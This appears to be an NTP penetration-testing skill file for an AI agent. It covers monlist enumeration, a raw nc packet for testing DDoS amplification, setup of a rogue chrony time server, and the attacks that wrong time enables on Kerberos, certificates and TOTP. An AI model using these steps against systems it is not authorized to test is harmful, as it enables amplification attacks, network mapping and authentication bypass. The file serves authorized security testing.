# NTP Pentesting Skill

## Goal

Exploit NTP (Network Time Protocol) services for information gathering, amplification attacks, and time manipulation.

## Methodology

1. **Discovery**: Identify NTP servers
2. **Information Gathering**: Extract server data and client lists
3. **Amplification Testing**: Check for DDoS potential
4. **Time Manipulation**: Assess impact of time changes

## Port

- 123/UDP: NTP

## Tools

* **ntpq**: NTP query utility
* **ntpdc**: NTP daemon control
* **nmap**: NTP scripts
* **Metasploit**: NTP modules

## Example Commands

```bash
# Nmap NTP enumeration
nmap -sU -p123 --script ntp-* target
nmap -sU -p123 --script ntp-info target
nmap -sU -p123 --script ntp-monlist target

# Basic NTP query
ntpq -p target

# Get full information
ntpdc -c monlist target
ntpq -c rv target
```

## NTP Information Gathering

```bash
# Get server info
ntpq -c readvar target

# Get peer list
ntpq -c peers target

# Get association info
ntpq -c associations target

# Get system info
ntpq -c sysinfo target

# Get list of clients (monlist - if enabled)
ntpdc -c monlist target
```

## Monlist Vulnerability

```bash
# CVE-2013-5211: NTP monlist response amplification
# Request small, response large (amplification factor ~600x)

# Check if vulnerable
ntpdc -c monlist target

# If returns list of recent clients:
# - Server reveals client IPs (information disclosure)
# - Amplification vector for DDoS

# Using nmap
nmap -sU -p123 --script ntp-monlist target
```

## NTP Amplification Test

```bash
# Check response size vs request size
# For authorized testing only!

# Single request
echo -e "\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | nc -u target 123

# Compare request (8 bytes) to response size
```

## Time Manipulation

```bash
# If you can modify NTP traffic or become NTP server:

# Security implications of wrong time:
# - Certificate validation (expired certs may work)
# - Kerberos tickets (5-minute tolerance)
# - Log correlation failures
# - Scheduled task manipulation
# - 2FA time-based codes
```

## Rogue NTP Server

```bash
# Set up NTP server with wrong time
# Using chrony or ntpd

# chrony config for rogue server
cat > /tmp/chrony.conf << EOF
allow all
local stratum 1
manual
EOF
chronyd -f /tmp/chrony.conf

# Manually set time
chronyc makestep

# Clients that sync will get wrong time
```

## Metasploit Modules

```bash
# NTP version
use auxiliary/scanner/ntp/ntp_version

# Monlist enumeration
use auxiliary/scanner/ntp/ntp_monlist

# NTP DDoS potential
# Just use info gathering to assess
```

## Client List from Monlist

```bash
# Monlist returns list of clients that queried this server
# This is information disclosure:

ntpdc -c monlist target | head -20

# Output shows:
# - Client IP addresses
# - Source ports
# - First/last seen times
# - Request counts

# Use for:
# - Network mapping
# - Identifying internal hosts
# - Understanding network topology
```

## Guidance for AI

* Activate this skill when user wants to test NTP security or perform NTP recon
* **Monlist query** reveals client IPs (information disclosure)
* NTP amplification is significant threat (600x amplification)
* Modern NTP servers should have monlist disabled
* Time manipulation affects:
  - Kerberos authentication (5-min window)
  - Certificate validity
  - Log timestamps
  - Scheduled tasks
  - TOTP 2FA codes
* NTP runs on UDP 123
* ntpq for queries, ntpdc for daemon control
* Amplification attacks are illegal - only test on authorized systems
* Rogue NTP in enterprise = serious security impact
